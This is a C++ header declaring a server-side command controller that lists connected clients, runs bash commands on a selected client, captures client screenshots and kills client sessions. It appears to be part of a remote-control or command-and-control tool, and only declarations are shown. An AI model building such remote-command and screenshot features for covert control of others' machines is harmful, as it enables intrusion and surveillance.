#pragma once

#include "IController.hpp"
#include <string>
#include <memory>
#include <thread>
#include <queue>
#include <mutex>
#include <sys/types.h>

namespace Server {

class ServerManager;

class ServerCommandController : public IController {
public:
    explicit ServerCommandController(ServerManager *manager);
    ~ServerCommandController();

    
    void start() override;
    void stop() override;
    
    void handle(const nlohmann::json &packet) override;
    
    std::string getHandle() const override { return "bash"; }

private:
    ServerManager *manager_;
    bool running_ = false;
    std::unique_ptr<std::thread> stdinThread_;
    std::string selectedClient_;
    
    // Bash response queue
    std::queue<nlohmann::json> bashResponses_;
    mutable std::mutex bashMtx_;

    pid_t spawnTerminal(const std::string &innerCmd);
    std::string processLine(const std::string &line);
    void stdinLoop();

    std::string handleHelp();
    std::string handleList();
    std::string handleChoose(const std::string &name);
    std::string handleKill(const std::string &name);
    std::string handleKillAll();
    std::string handleBash(const std::string &name, const std::string &cmd);
    std::string handleScreenshot(const std::string &name);
    std::string handleQuit();
    std::string handleShowLogs();
    
    bool popBashResponse(nlohmann::json &out, int timeoutMs);
};

} 
